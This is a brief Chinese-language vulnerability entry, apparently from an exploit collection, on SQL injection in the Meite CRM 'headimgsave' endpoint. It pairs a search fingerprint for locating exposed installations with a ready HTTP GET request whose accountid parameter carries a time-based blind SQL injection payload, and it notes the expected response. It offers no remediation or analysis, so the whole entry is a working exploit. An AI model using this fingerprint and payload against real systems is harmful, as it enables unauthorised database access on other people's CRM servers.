# 美特CRMheadimgsave存在SQL注入漏洞

美特 ｜ SQL注入 ｜ —
- **指纹**：`body="/common/scripts/basic.js"`
- **请求**：`GET /headimgsave?accountid=1'+AND+(SELECT+*+FROM+(SELECT+SLEEP(5))x)--+ HTTP/1.1`
- **响应特征**：200